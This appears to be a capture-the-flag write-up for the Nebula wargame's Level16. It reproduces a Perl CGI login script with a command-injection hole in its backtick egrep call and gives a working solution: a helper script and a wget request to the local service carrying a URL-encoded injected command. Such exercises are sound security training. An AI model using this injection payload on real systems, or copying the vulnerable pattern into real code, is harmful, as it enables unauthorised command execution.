# Level16

#### About

There is a perl script running on port 1616. 
To do this level, log in as the level16 account with the password level16. Files for this level can be found in /home/flag16. 


#### Source code

```
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
	$username = $_[0];
	$password = $_[1];

	$username =~ tr/a-z/A-Z/;	# conver to uppercase
	$username =~ s/\s.*//;		# strip everything after a space

	@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
	foreach $line (@output) {
		($usr, $pw) = split(/:/, $line);
	

		if($pw =~ $password) { 
			return 1;
		}
	}

	return 0;
}

sub htmlz {
	print("<html><head><title>Login resuls</title></head><body>");
	if($_[0] == 1) {
		print("Your login was accepted<br/>");
	} else {
		print("Your login failed<br/>");
	}	
	print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));
```

#### Solutions

```
echo ${PWD,,}

level16@nebula:~$ ${/BIN/GETFLAG>/TMP/11.TXT,,}
-sh: ${/BIN/GETFLAG>/TMP/11.TXT,,}: bad substitution
level16@nebula:~$ CMD=/BIN/GETFLAG;${CMD,,}
getflag is executing on a non-flag account, this doesn't count

level16@nebula:~$ cat /tmp/exp.sh 
#!/bin/bash

/bin/getflag>>/tmp/lv16.txt
level16@nebula:~$ wget http://localhost:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3BP%3D%2FTMP%2FEXP.SH%3B%24{P%2C%2C}%3B%23&password=
```
